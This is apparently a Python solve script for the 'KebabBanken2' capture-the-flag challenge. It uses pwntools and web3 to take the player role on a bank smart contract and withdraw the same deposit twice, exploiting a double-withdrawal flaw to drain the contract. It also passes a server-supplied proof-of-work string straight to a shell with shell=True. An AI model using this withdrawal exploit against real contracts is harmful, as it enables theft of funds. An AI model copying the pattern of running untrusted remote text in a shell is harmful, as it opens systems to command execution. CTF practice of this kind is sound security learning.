import web3
import json
from pwn import *
import subprocess

ADDR = "kebabbanken-2.ctfchall.se"
PORT = 50000

# Connect to challenge
io = remote(ADDR, PORT, ssl=True)
io.sendlineafter(b"> ", b"1")

pow_yay = io.recvline()[:-1].decode()
pow_res = subprocess.check_output(pow_yay, shell=True).decode().strip()
io.sendlineafter(b"Solution please: ", pow_res)

io.recvuntil(b"Blockchain info:\n")

uuid = io.recvline().strip().decode().split(" ")[-1]
rpc = io.recvline().strip().decode().split(" ")[-1].replace("[addr]", ADDR)
private_key = io.recvline().strip().decode().split(" ")[-1]
my_addr = io.recvline().strip().decode().split(" ")[-1]
target_addr = io.recvline().strip().decode().split(" ")[-1]

print(f"{uuid = }")
print(f"{rpc = }")
print(f"{private_key = }")
print(f"{my_addr = }")
print(f"{target_addr = }")

with open("abi/KebabBanken2.abi", "r") as openfile:
    bank_abi = json.load(openfile)

with open("abi/Setup.abi", "r") as openfile:
    setup_abi = json.load(openfile)

w3 = web3.Web3(web3.HTTPProvider(rpc))
setup_contract = w3.eth.contract(address=target_addr, abi=setup_abi)
my_addr = w3.eth.account.from_key(private_key).address

bank_addr = setup_contract.functions.bank().call()
print(f"{bank_addr = }")

contract = w3.eth.contract(address=bank_addr, abi=bank_abi)

def trans(func, extra=None):
    txn = func.build_transaction(
        {
            "from": my_addr,
            "gas": 10000000,
            "nonce": w3.eth.get_transaction_count(my_addr),
            "gasPrice": w3.eth.gas_price,
        } | (extra or {})
    )

    signed_txn = w3.eth.account.sign_transaction(txn, private_key)
    txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)

    if txn_receipt["status"] == 1:
        print(f"Transaction Successful! Transaction hash: {txn_hash.hex()}")
    else:
        print(f"Transaction Failed: {txn_hash.hex()}")
        result = w3.eth.call(txn)
        print(f"{result = }")


def generate_hash(name, identifier, amount):
    return w3.solidity_keccak(
        ['string', 'string', 'uint256'],
        [name, identifier, amount]
    ).hex()


# 1️⃣ Step 1: Call hello() to become the `player`
print("Calling hello() to take control of `player`...")
trans(setup_contract.functions.hello())

# 2️⃣ Step 2: Exploit the existing account
account_name = "john pork hawk tuah"
tx_identifier = "initial_deposit"
deposit_amount = w3.to_wei(100, "ether")  # 100 ether was deposited in the constructor

tx_hash = generate_hash(account_name, tx_identifier, deposit_amount)

# Withdraw twice to cause a balance mismatch
print("Withdrawing funds (1st time)...")
trans(contract.functions.withdraw(tx_identifier, deposit_amount))

print("Withdrawing funds (2nd time)...")
trans(contract.functions.withdraw(tx_identifier, deposit_amount))  # Exploit!

# 3️⃣ Step 3: Check if we solved the challenge
solved = setup_contract.functions.isSolved().call()
print("Is solved?", solved)

if solved:
    print("🎉 Exploit Successful! Challenge Solved! 🎉")
    io.close()
    io = remote(ADDR, PORT, ssl=True)
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", uuid.encode())
